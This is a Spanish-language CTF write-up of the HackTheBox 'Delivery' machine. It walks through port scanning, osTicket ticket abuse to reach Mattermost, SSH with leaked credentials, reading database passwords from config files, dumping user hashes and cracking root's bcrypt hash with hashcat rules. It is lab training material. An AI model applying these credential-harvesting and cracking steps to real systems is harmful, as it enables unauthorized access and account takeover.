---
layout: post
title: HTB Delivery
date: 2024-08-14 22:42:53 -0500
categories:
  - HTB
  - Easy
tags:
  - Linux
  - Web
  - Subdomains
  - Enumeration
  - DataBase
  - Hash
  - Cracking
  - HashCat
image:
  path: /delivery/preview.png
  alt: Delivery
---

## Resumen 
![logo](/delivery/logo.png){: .right w="200" h="200" }
**Delivery** es una máquina que toca un tema totalmente nuevo para mí, y tiene algunos puntos bastante interesantes. Al empezar, podemos ver **2 webs** y un servidor **SSH**. Sin embargo, en una se menciona que en el momento en que consigamos un **correo válido** nos podemos crear una cuenta válida en la otra. Además de esto, se nos entrega un **subdominio** que se encuentra usando el software **osTicket**. Al investigar un poco en internet, se encuentra un ataque llamado **Ticket-Trick**, que consiste en usar un **ticket válido** para recibir el mensaje de validación de una cuenta y, con esto, poder ingresar a los servidores de mensajería usados por las empresas, como lo es **MatterMost**.

Ahora, con una cuenta creada, podemos ver un canal donde se habla de algunas medidas de **seguridad** que se piensan aplicar en la empresa. Sin embargo, también se filtra un par de **credenciales** que pueden ser utilizadas en el servidor **SSH**. Por otro lado, se filtra una **credencial** que parece ser la del **administrador**; sin embargo, se dice que esta está usando **variantes**, por lo que habrá que descubrir cuál. Una vez dentro del servidor, se encuentran varias **credenciales** para las bases de datos de **osTicket** y **MatterMost**. Sin embargo, en este último parece haber un **hash interesante** para el usuario **root**, quien es el que mencionaba el tema de la **password**. Por lo tanto, se puede intentar romperlo de manera online con ayuda de **Hashcat** y las reglas de cifrado para probar variantes de la credencial filtrada. Con esto, se puede romper el **hash** y se obtiene acceso a la cuenta de **root**, donde se puede leer la **flag final**.


## Reconocimiento

Para empezar, se realiza un **ping** para saber si hay conectividad con la máquina.

```bash
ping -c 1 10.129.240.197
PING 10.129.240.197 (10.129.240.197) 56(84) bytes of data.
64 bytes from 10.129.240.197: icmp_seq=1 ttl=63 time=169 ms

--- 10.129.240.197 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 168.583/168.583/168.583/0.000 ms
```
{: .nolineno}


### Escaneo de Puertos
Luego se realiza un **escaneo de puertos** para ver cuáles se encuentran abiertos dentro de la máquina.
```bash
sudo nmap -p- --min-rate 2000  10.129.240.197  -sS  -Pn -oA TCPports

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 17:14 EDT
Warning: 10.129.240.197 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.240.197
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8065/tcp open  unknown
```
{: .nolineno}


Ahora, con la información obtenida, se puede realizar un escaneo mucho más profundo para obtener información como **servicios** y **versiones**.

```bash
sudo nmap -p22,80,8065  --min-rate 2000 10.129.240.197  -sSCV  -Pn -oA TCPversions -vv

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq549E025Q9FR27LDR6WZRQ52ikKjKUQLmE9ndEKjB0i1qOoL+WzkvqTdqEU6fFW6AqUIdSEd7GMNSMOk66otFgSoerK6MmH5IZjy4JqMoNVPDdWfmEiagBlG3H7IZ7yAO8gcg0RRrIQjE7XTMV09GmxEUtjojoLoqudUvbUi8COHCO6baVmyjZRlXRCQ6qTKIxRZbUAo0GOY8bYmf9sMLf70w6u/xbE2EYDFH+w60ES2K906x7lyfEPe73NfAIEhHNL8DBAUfQWzQjVjYNOLqGp/WdlKA1RLAOklpIdJQ9iehsH0q6nqjeTUv47mIHUiqaM+vlkCEAN3AAQH5mB/1
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiAKnk2lw0GxzzqMXNsPQ1bTk35WwxCa3ED5H34T1yYMiXnRlfssJwso60D34/IM8vYXH0rznR9tHvjdN7R3hY=
|   256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEV5D6eYjySqfhW4l4IF1SZkZHxIRihnY6Mn6D8mLEW7
80/tcp   open  http    syn-ack ttl 63 nginx 1.14.2
|_http-title: Welcome
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
8065/tcp open  unknown syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Thu, 15 Aug 2024 21:12:33 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: mxkxorgwp7f6td4g3jg6ucs9ro
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Thu, 15 Aug 2024 21:22:41 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Thu, 15 Aug 2024 21:22:42 GMT
|_    Content-Length: 0
```
{: .nolineno}

## Enumeración

### Web Puerto 80

![web](/delivery/web.png)

![contact](/delivery/contact.png)


![contact](/delivery/subdomain.png)

```bash
127.0.0.1   localhost
127.0.1.1   kali
::1     localhost ip6-localhost ip6-loopback
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters

10.129.240.197  helpdesk.delivery.htb delivery.htb
```

### Web Puerto 8085


![matter](/delivery/matter.png)

>Mattermost es un **conjunto de herramientas de colaboración que tiene como epicentro un servicio de mensajería instantánea**, desde lo cuál se puede acceder al resto de funcionalidades.
{: .prompt-info}


![verify](/delivery/create.png)


![verify](/delivery/verify.png)



### Subdominio helpdesk


![helpdesk](/delivery/helpdesk.png)



![openTicket](/delivery/openTicket.png)



![createTicket](/delivery/createTicket.png)


![ticketInfo](/delivery/ticketInfo.png)



![checkTicket](/delivery/checkTicket.png)



![data](/delivery/data.png)



## Explotación 

>ddas
{: .prompt-info}




![validAccount](/delivery/validAccount.png)


![verificationMail](/delivery/verificationMail.png)


![login](/delivery/login.png)


![internal](/delivery/internal.png)


![leak](/delivery/leak.png)


```python
ssh maildeliverer@delivery.htb
maildeliverer@delivery.htb's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$ hostname
Delivery
maildeliverer@Delivery:~$ ls
user.txt
```




## Escalada de Privilegios

### Enumeración bases de datos 

Al ingresar en la máquina, podemos realizar las validaciones habituales. Sin embargo, hay una que nos llama la atención, ya que se está usando el puerto **3306**, lo que nos indica que hay una **base de datos** corriendo. Por lo tanto, podríamos intentar buscar los **archivos de configuración** para los servicios de **osTicket** y de **MatterMost**, y con las **credenciales** que se encuentren en ellos podríamos autenticarnos en la **DB**.

```bash
maildeliverer@Delivery:/var/www/osticket/upload/include$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 :::8065                 :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:631             0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:37603           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp6       0      0 :::47266                :::*                                -                   
udp6       0      0 :::5353                 :::*                                -     

```

##### DB  OsTicket

Para **osTicket**, hay un archivo de **conexión** que podemos usar para conectarnos y leer qué información importante hay en la **base de datos**.

```c
maildeliverer@Delivery:/var/www/osticket/upload/include$ cat ost-config.php 

# Encrypt/Decrypt secret key - randomly generated during installation.
define('SECRET_SALT','nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3');

#Default admin email. Used only on db connection issues and related alerts.
define('ADMIN_EMAIL','maildeliverer@delivery.htb');

# Database Options
# ---------------------------------------------------
# Mysql Login info
define('DBTYPE','mysql');
define('DBHOST','localhost');
define('DBNAME','osticket');
define('DBUSER','ost_user');
define('DBPASS','!H3lpD3sk123!');

# Table prefix
define('TABLE_PREFIX','ost_');
```


```sql
mysql -u  ost_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 86
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 

```

Hacemos uso de la base de datos que se encuentra en el archivo, y luego podemos listar las diferentes tablas que se encuentran en ella. De la cual destaca una llamada **ost_user**.

```sql
MariaDB [(none)]> USE osticket ;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [osticket]> SHOW TABLES;
+--------------------------+
| Tables_in_osticket       |
+--------------------------+
| ost__search              |
| ost_api_key              |
| ost_attachment           |
| ost_canned_response      |
| ost_config               |
| ost_content              |
| ost_translation          |
| ost_user                 |
| ost_user__cdata          |
| ost_user_account         |
| ost_user_email           |
+--------------------------+
70 rows in set (0.001 sec)
```

Sin embargo, no parece tener nada interesante, excepto los **nombres de usuario** que parecen ser **hashes**, pero lamentablemente esto no nos lleva a nada.

```sql
MariaDB [osticket]> select * from ost_user ;
+----+--------+------------------+--------+----------------------------------+---------------------+---------------------+
| id | org_id | default_email_id | status | name                             | created             | updated             |
+----+--------+------------------+--------+----------------------------------+---------------------+---------------------+
|  1 |      1 |                1 |      0 | osTicket Support                 | 2020-12-26 09:14:00 | 2020-12-26 09:14:00 |
|  2 |      0 |                2 |      0 | bob                              | 2021-01-05 03:26:08 | 2021-01-05 03:26:08 |
|  3 |      0 |                3 |      0 | 9ecfb4be145d47fda0724f697f35ffaf | 2021-01-05 06:06:28 | 2021-01-05 06:06:28 |
|  4 |      0 |                4 |      0 | c3ecacacc7b94f909d04dbfd308a9b93 | 2021-01-05 06:06:39 | 2021-01-05 06:06:39 |
|  5 |      0 |                5 |      0 | ff0a21fc6fc2488195e16ea854c963ee | 2021-01-05 06:06:45 | 2021-01-05 06:06:45 |
|  6 |      0 |                6 |      0 | 5b785171bfb34762a933e127630c4860 | 2021-01-05 06:06:46 | 2021-01-05 06:06:46 |
|  7 |      0 |                7 |      0 | madlies                          | 2024-08-15 18:17:25 | 2024-08-15 18:17:25 |
+----+--------+------------------+--------+----------------------------------+---------------------+---------------------+
```
##### DB Mattermost

Por el lado de **MatterMost**, también se encuentra un archivo de **configuración** con **credenciales** dentro de la carpeta `/opt/mattermost/config`. Por lo tanto, se puede realizar el mismo proceso para enumerar la **base de datos**.

```json
maildeliverer@Delivery:/opt/mattermost/config$ cat config.json 
...
   "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
    },
...
```

Al listar las **bases de datos**, hay una que se llama como el servicio, por lo que podemos listarla para ver qué **tablas** contiene.

```sql
maildeliverer@Delivery:/opt/mattermost/config$ mysql -u  mmuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 87
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> USE mattermost
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mattermost]> 
```

```bash
MariaDB [mattermost]> SHOW TABLES;
+------------------------+
| Tables_in_mattermost   |
+------------------------+

| Threads                |
| Tokens                 |
| UploadSessions         |
| UserAccessTokens       |
| UserGroups             |
| UserTermsOfService     |
| Users                  |
+------------------------+
```

Dentro de esta, hay una tabla llamada **Users**, por lo que podemos listar su contenido y ver toda la información, incluyendo **usuarios** y **contraseñas** hasheadas. Con esto en mente, podemos tomar como objetivo la del usuario llamado **root** y lanzar el ataque.

```sql
MariaDB [mattermost]> select * from Users;
+----------------------------+---------------+---------------+----------+----------------------------------+--------------------------------------------------------------+----------+-------------+-------------------------+---------------+----------+--------------------+----------+----------+--------------------------+----------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+-------------------+----------------+--------+--------------------------------------------------------------------------------------------+-----------+-----------+
| Id                         | CreateAt      | UpdateAt      | DeleteAt | Username                         | Password                                                     | AuthData | AuthService | Email                   | EmailVerified | Nickname | FirstName          | LastName | Position | Roles                    | AllowMarketing | Props | NotifyProps                                                                                                                                                                  | LastPasswordUpdate | LastPictureUpdate | FailedAttempts | Locale | Timezone                                                                                   | MfaActive | MfaSecret |
+----------------------------+---------------+---------------+----------+----------------------------------+--------------------------------------------------------------+----------+-------------+-------------------------+---------------+----------+--------------------+----------+----------+--------------------------+----------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+-------------------+----------------+--------+--------------------------------------------------------------------------------------------+-----------+-----------+
| 64nq8nue7pyhpgwm99a949mwya | 1608992663714 | 1608992663731 |        0 | surveybot                        |                                                              | NULL     |             | surveybot@localhost     |             0 |          | Surveybot          |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1608992663714 |     1608992663731 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}                 |         0 |           |
| 6akd5cxuhfgrbny81nj55au4za | 1609844799823 | 1609844799823 |        0 | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | NULL     |             | 4120849@delivery.htb    |             0 |          |                    |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609844799823 |                 0 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}                 |         0 |           |
| 6wkx1ggn63r7f8q1hpzp7t4iiy | 1609844806814 | 1609844806814 |        0 | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | NULL     |             | 7466068@delivery.htb    |             0 |          |                    |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609844806814 |                 0 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}                 |         0 |           |
| 95nj97i1zpdmtc7986b87ho8oy | 1723761501132 | 1723761688909 |        0 | papita123                        | $2a$10$KHYDybh9PXD/hv9Cc4MZYeNU9s0B7YCtA3fb2nbovbEGSaJtT/ecG | NULL     |             | 1122407@delivery.htb    |             1 |          |                    |          |          | system_user              |              1 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1723761501132 |                 0 |              0 | en     | {"automaticTimezone":"America/New_York","manualTimezone":"","useAutomaticTimezone":"true"} |         0 |           |
| dijg7mcf4tf3xrgxi5ntqdefma | 1608992692294 | 1609157893370 |        0 | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | NULL     |             | root@delivery.htb       |             1 |          |                    |          |          | system_admin system_user |              1 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609157893370 |                 0 |              0 | en     | {"automaticTimezone":"Africa/Abidjan","manualTimezone":"","useAutomaticTimezone":"true"}   |         0 |           |
| hatotzdacb8mbe95hm4ei8i7ny | 1609844805777 | 1609844805777 |        0 | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | NULL     |             | 9122359@delivery.htb    |             0 |          |                    |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609844805777 |                 0 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}                 |         0 |           |
| jing8rk6mjdbudcidw6wz94rdy | 1608992663664 | 1608992663664 |        0 | channelexport                    |                                                              | NULL     |             | channelexport@localhost |             0 |          | Channel Export Bot |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1608992663664 |                 0 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}                 |         0 |           |
| n9magehhzincig4mm97xyft9sc | 1609844789048 | 1609844800818 |        0 | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | NULL     |             | 5056505@delivery.htb    |             1 |          |                    |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609844789048 |                 0 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}                 |         0 |           |
| rrd1kejmzbn4iq3drkqeuycqgc | 1723761244582 | 1723761356470 |        0 | hacker123                        | $2a$10$RM03XAaY91XrDJelPb9o/Or.RjcihjuzufuiouQwRghsJ76cFDWaK | NULL     |             | 1645736@delivery.htb    |             1 |          |                    |          |          | system_user              |              1 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1723761244582 |                 0 |              2 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}                 |         0 |           |
| u7wgqejtepgczbowxm5cchqrwa | 1723758622805 | 1723758622805 |        0 | madlies                          | $2a$10$5ktdjszWeMN8OZm1k/nWHe00itTE0HRcCK9BlFmzXu8tz3VwPACzu | NULL     |             | madlies@madlies.com     |             0 |          |                    |          |          | system_user              |              1 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1723758622805 |                 0 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}                 |         0 |           |
+----------------------------+---------------+---------------+----------+----------------------------------+--------------------------------------------------------------+----------+-------------+-------------------------+---------------+----------+--------------------+----------+----------+--------------------------+----------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+-------------------+----------------+--------+--------------------------------------------------------------------------------------------+-----------+-----------+
```


Ahora solo es necesario guardar el **hash** y la posible **contraseña** en un archivo, y definir qué conjunto de **variantes** vamos a aplicar para lograr **crackear** el hash.

```bash
cat hash.txt

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
```

```bash
cat posiblePass.txt

PleaseSubscribe!
```

```bash
hashcat -a 0 -m 3200 ./h4sh.txt ./posiblePass.txt -r /usr/share/hashcat/rules/best64.rule

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Thu Aug 15 00:32:40 2024 (7 secs)
Time.Estimated...: Thu Aug 15 00:32:47 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (./posiblePass.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        3 H/s (1.09ms) @ Accel:4 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 21/77 (27.27%)
Rejected.........: 0/21 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:20-21 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: PleaseSubscribe!21 -> PleaseSubscribe!21
Hardware.Mon.#1..: Util: 23%
```

Ahora que contamos con esta **credencial**, podemos intentar autenticarnos dentro de la máquina como el usuario **root**, con lo que obtendremos máximos privilegios sobre la misma.

```go
maildeliverer@Delivery:/opt/mattermost/config$ su root
Password: PleaseSubscribe!21
root@Delivery:/opt/mattermost/config# cd /root/
root@Delivery:~# cat root.txt 
a14bfb462f2abad866adc18f978fec08
root@Delivery:~# 
```

